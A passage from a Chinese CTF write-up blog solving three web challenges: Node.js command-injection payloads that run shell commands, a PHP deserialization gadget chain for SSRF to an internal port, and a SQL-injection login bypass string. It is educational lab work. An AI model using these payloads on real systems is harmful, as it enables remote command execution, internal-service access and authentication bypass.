<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.values</span>(require('child_process'))<span class="hljs-selector-attr">[5]</span>('cat${IFS}/G*&gt;p')&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.<br></code></pre></td></tr></tbody></table></figure>
<p>执行之后直接读取p试试。</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-built_in">require</span>('child_process')<span class="hljs-selector-class">.spawnSync</span>('nl',['p'])<span class="hljs-selector-class">.stdout</span><span class="hljs-selector-class">.toString</span>();&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211955346.png" alt="image-20240313211955346"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://arsenetang.com/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/#2-ez-calc">WP篇之解析2021 GFCTF中的两道Web</a></p>
<h1>[SWPUCTF 2022 新生赛]Power!</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313212144086.png" alt="image-20240313212144086"></p>
<p>看到hint说给source传参，猜测是查看文件。</p>
<p>index.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">"flag"</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">"http://127.0.0.1/"</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$a</span></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();<br>        }<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadfile</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;path)){<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/"</span>.<span class="hljs-variable">$this</span>-&gt;black_list.<span class="hljs-string">"/i"</span>,<span class="hljs-variable">$this</span>-&gt;path)){<br>                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">"cheems.jpg"</span>);<br>                }<span class="hljs-keyword">else</span>{<br>                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-variable">$this</span>-&gt;path);<br>                }<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">"cheems.jpg"</span>);<br>            }<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file</span>).<span class="hljs-string">'"/&gt;'</span>;<br>        }<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>{<br>            <span class="hljs-variable">$url</span> = <span class="hljs-variable">$path</span>;<br>            <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>            <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>            <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>        }<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;local = <span class="hljs-string">"http://127.0.0.1/"</span>;<br>        }<br>    }<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">"hacker.jpg"</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goodman</span>(<span class="hljs-params"><span class="hljs-variable">$i</span>,<span class="hljs-variable">$j</span></span>)</span>{<br>            <span class="hljs-variable">$i</span>-&gt;<span class="hljs-variable">$j</span> = <span class="hljs-variable language_">$this</span>-&gt;superhacker;<br>        }<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">goodman</span>(<span class="hljs-variable">$this</span>-&gt;a,<span class="hljs-variable">$this</span>-&gt;b);<br>            <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        }<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'source'</span>])){<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'image_path'</span>])){<br>            <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'image_path'</span>];    <span class="hljs-comment">//flag in /flag.php</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$path</span>)&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/http:|gopher:|glob:|php:/i"</span>,<span class="hljs-variable">$path</span>)){<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>)).<span class="hljs-string">'"/&gt;'</span>;<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"cheems.jpg"</span>)).<span class="hljs-string">'"/&gt;'</span>;<br>            }<br>            <br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path_info'</span>])){<br>            <span class="hljs-variable">$path_info</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path_info'</span>];<br>            <span class="hljs-variable">$FV</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path_info</span>));<br>            <span class="hljs-variable">$FV</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-variable">$path</span> = <span class="hljs-string">"vergil.jpg"</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;POWER!!&lt;/h2&gt;</span><br><span class="hljs-string">            &lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>)).<span class="hljs-string">'"/&gt;'</span>;<br>        }<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>我们先看一下flag.php里面有什么，给image_path传参即可。如下所示，说flag在65500端口处</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">"good job,but there is no flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">i put my flag in intranet(127.0.0.1:65500)</span><br><span class="hljs-string"></span><br><span class="hljs-string">outsider have no permissions to get it</span><br><span class="hljs-string"></span><br><span class="hljs-string">if you want it,then you have to take it</span><br><span class="hljs-string"></span><br><span class="hljs-string">but you already knew the rules</span><br><span class="hljs-string"></span><br><span class="hljs-string">try it"</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>接下来就是找链子，不难找到<code>Backdoor.__destruct-》FileViewer.__call-》FileViewer.loadfile-》FileViewer::curl()</code></p>
<p>链子虽然不难找，但是我却又陷入了误区，不会做，首先先看下面的点（别的师傅强调的）</p>
<blockquote>
<p>当我们的反序列化正在执行的时候，会同时执行 $FV-&gt;loadfile();这个语句，但是$FV是Backdoor的对象，根本没有这个方法，所以会报错。那么就要让$FV是FileViewer的对象。</p>
</blockquote>
<p>按照我们设想，本来是想backdoor包含fileviewer类的，但是按照上述的tip，必须fileviwer类包含backdoor才行。</p>
<p>然后问了GPT发现反序列化顺序是先反序列化外部类，后反序列化内部类。这样的话就说通了：先上链子</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>  = <span class="hljs-string">"flag"</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">"local"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;superhacker = <span class="hljs-string">"http://127.0.0.1:65500/"</span>;<br>    }<br>}<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<br><span class="hljs-variable">$b</span>-&gt;local = <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></tbody></table></figure>
<p>首先外部类为FileViewer，因此反序列化的时候会首先调用FileViewer类中的wakeup方法，导致local参数内容被修改。但我们注意到backdoor类中的goodman可以修改类的属性，那就可以将backdoor类中的a参数赋值为FileViewer，b赋值为local，$superhacker赋值为<code>http://127.0.0.1:65500/</code>，这样经过goodman的话就是：</p>
<p>FileViewer-&gt;local = <code>http://127.0.0.1:65500</code>，达到效果。而这里我们需要让backdoor类被包含，那看了看参数只有local可以使用，我们令local为backdoor类对象，这样的话，反序列化先调用wakeup修改了local内容，但在脚本执行结束的时候，会自动调用析构函数来进行处理（GC回收机制）这样的话，我们又会重新调用FileViewer类对象中的call魔术方法，接着调用loadfile-》curl方法，导致最终的flag回显。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313215232524.png" alt="image-20240313215232524"></p>
<h2 id="参考文章-2">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2022/10/2022-swpu-nss-%E6%96%B0%E7%94%9F%E8%B5%9B-web-writeup/#power">2022 SWPU NSS 新生赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62306641/article/details/135141582">[SWPUCTF 2022 新生赛]Power!</a></p>
<h1>[SWPUCTF 2023 秋季新生赛]查查need</h1>
<p>这道题也是被我惯性思维导致做不出来吧，这里题目提示说是尝试万能密码。那我们就需要找注入点，这里找了半天也没有效果。看了wp发现是思路太死板吧，我只进行了单引号的尝试，没想到这里是当输入双引号之后会产生报错。导致我错过了注入点。</p>
<h2 id="万能密码">万能密码</h2>
<p><img src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240314182950844.png" alt=""></p>
<p>首先是一个成绩查询系统，这里根据马后炮我们在post传参出都添加双引号进行尝试，就会发现，当学号处输入双引号就会引发报错</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183045200.png" alt="image-20240314183045200"></p>
<p>很明显这里就是注入点了，结合万能密码的提示，那大概率就是这样构造：<code>222" or "1"="1"%23</code>这样就能永真了，而这里的姓名我们需要是正确的才行，很幸运，姓名这里右上角给了我们了，只需要写个脚本提取一下（为了不乱码我提取的时候url编码了）</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> openpyxl<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_student_names</span>(<span class="hljs-params">file_path, output_file</span>):<br>    workbook = openpyxl.load_workbook(file_path)<br>    sheet = workbook.active<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows(values_only=<span class="hljs-literal">True</span>):<br>            student_name = row[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 假设学生姓名在第一列</span><br>            <span class="hljs-keyword">if</span> student_name:<br>                student_name = quote(student_name)<br>                f.write(student_name + <span class="hljs-string">'\n'</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'学生姓名提取完成！'</span>)<br><br><span class="hljs-comment"># 调用示例</span><br>xlsx_file = <span class="hljs-string">'文件地址'</span>  <span class="hljs-comment"># 替换为您的文件路径</span><br>output_txt = <span class="hljs-string">'student_names.txt'</span>  <span class="hljs-comment"># 替换为输出文件的路径</span><br><br>extract_student_names(xlsx_file, 